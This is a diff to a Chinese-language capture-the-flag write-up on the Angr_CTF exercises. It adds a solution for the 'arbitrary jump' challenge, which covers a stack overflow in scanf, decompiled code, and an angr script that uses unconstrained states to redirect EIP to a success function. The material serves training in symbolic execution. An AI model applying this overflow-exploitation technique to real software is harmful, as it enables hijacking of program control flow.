@@ -2615,7 +2615,7 @@ class ReplaceScanf(angr.SimProcedure):
         scanf0 = claripy.BVS('scanf0',  32)
         scanf1 = claripy.BVS('scanf1', 20*8)
         for ch in scanf1.chop(bits=8):
-            self.state.add_constraints(ch >= '0', ch <='z')
+            self.state.add_constraints(ch >= b'0', ch <= b'z')
         scanf0_address = param0
         self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)
         scanf1_address = param1
@@ -2729,7 +2729,7 @@ class ReplaceScanf(angr.SimProcedure):
         scanf0 = claripy.BVS('scanf0',  32)
         scanf1 = claripy.BVS('scanf1', 20*8)
         for ch in scanf1.chop(bits=8):
-            self.state.add_constraints(ch >= '0', ch <='z')
+            self.state.add_constraints(ch >= b'0', ch <= b'z')
         scanf0_address = param0
         self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)
         scanf1_address = param1
@@ -2776,11 +2776,125 @@ else:
 ```bash
 ┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]
 └─$ python 16_angr_arbitrary_write.py
+WARNING  | 2023-07-15 11:51:32,653 | angr.project   | Address is already hooked, during hook(0x57600014, <SimProcedure ReplaceScanf>). Re-hooking.
 [+] Congratulations! Solution is: 11604995 NDYNWEUJCCCC3CCCDCXW
 
 ┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]
 └─$ ./16_angr_arbitrary_write
 Enter the password: 11604995 NDYNWEUJCCCC3CCCDCXW
+Good Job.
+```
+
+------
+
+### 17_angr_arbitrary_jump
+
+先用`file ./17_angr_arbitrary_jump`查看文件类型，并用`checksec ./17_angr_arbitrary_jump`查看文件信息。
+
+```bash
+┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]
+└─$ file ./17_angr_arbitrary_jump
+./17_angr_arbitrary_jump: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=961e45c2606e45a0cd255d27ef45a12ad33123ce, not stripped
+                                                                                                          
+┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]
+└─$ checksec ./17_angr_arbitrary_jump 
+[*] '/home/tyd/ctf/Angr_CTF/17_angr_arbitrary_jump'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开二进制文件`17_angr_arbitrary_jump`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  printf("Enter the password: ");
+  read_input();
+  puts("Try again.");
+  return 0;
+}
+```
+
+双击`read_input()`函数查看详情，显然存在栈溢出漏洞。
+
+```c
+int read_input()
+{
+  char v1[32]; // [esp+28h] [ebp-20h] BYREF
+
+  return __isoc99_scanf("%s", v1);
+}
+```
+
+首先我们需要对`scanf()`函数进行`hook`，然后需要改变`Angr`模拟时的默认设置，`save_unconstrained=True`指定`Angr`不抛出不受约束的状态，而是将这些不受约束的状态移动到名为`simulation.unconstrained`的`stashes`中。此外，我们还会使用一些默认情况下不包含的`stashes`，如`'found'`和`'not_needed'`。这里简单提一下：
+
+- `active`：程序仍能进一步执行。
+- `deadended`：程序结束。
+- `errored`：Angr执行中出现错误的状态。
+- `unconstrained`：不受约束的状态。
+- `found`：找到路径答案的状态。
+- `not_needed`：所有其它情况。
+
+编写`Python`代码求解得到`@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IRXB@@@@@@@@@@@@@@@@@@@@@@@@`。
+
+```python
+import angr
+import claripy
+
+path_to_binary = './17_angr_arbitrary_jump'
+project = angr.Project(path_to_binary, auto_load_libs=False)
+initial_state = project.factory.entry_state(
+    add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
+                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS})
+scanf_symbol = '__isoc99_scanf'
+class ReplaceScanf(angr.SimProcedure):
+    def run(self, format_string, input_buffer_address):
+        input_buffer = claripy.BVS('input_buffer',  64*8)
+        for ch in input_buffer.chop(bits=8):
+            self.state.add_constraints(ch >= b'0', ch <= b'z')
+        self.state.memory.store(input_buffer_address, input_buffer)
+        self.state.globals['solution'] = input_buffer
+
+project.hook_symbol(scanf_symbol, ReplaceScanf())
+simulation = project.factory.simgr(
+    initial_state, save_unconstrained=True,
+    stashes={
+      'active' : [initial_state],
+      'unconstrained' : [],
+      'found' : [],
+      'not_needed' : []
+    })
+while ((simulation.active or simulation.unconstrained) and (not simulation.found)):
+    for unconstrained_state in  simulation.unconstrained:
+        simulation.move('unconstrained', 'found')
+    simulation.step()
+print_good_address = project.loader.main_object.get_symbol('print_good').rebased_addr  # 0x42585249 
+if simulation.found:
+    solution_state = simulation.found[0]
+    solution_state.add_constraints(solution_state.regs.eip == print_good_address)
+    solution = solution_state.globals['solution']
+    passwd = solution_state.solver.eval(solution, cast_to=bytes).decode()
+    print('[+] Congratulations! Solution is: %s' % passwd)
+else:
+    raise Exception('Could not find the solution')
+```
+
+运行程序进行验证无误。
+
+```bash
+┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]
+└─$ python 17_angr_arbitrary_jump.py
+WARNING  | 2023-07-15 17:12:32,255 | angr.project   | Address is already hooked, during hook(0x42600010, <SimProcedure ReplaceScanf>). Re-hooking.                                                                  
+WARNING  | 2023-07-15 17:12:32,860 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 Reverse(input_buffer_8_512[223:192])>                              
+WARNING  | 2023-07-15 17:12:33,176 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 Reverse(input_buffer_9_512[223:192])>                              
+[+] Congratulations! Solution is: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IRXB@@@@@@@@@@@@@@@@@@@@@@@@
+
+┌──(angr)─(tyd㉿kali-linux)-[~/ctf/Angr_CTF]			
+└─$ ./17_angr_arbitrary_jump              
+Enter the password: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IRXB@@@@@@@@@@@@@@@@@@@@@@@@
 Good Job.
 ```
 
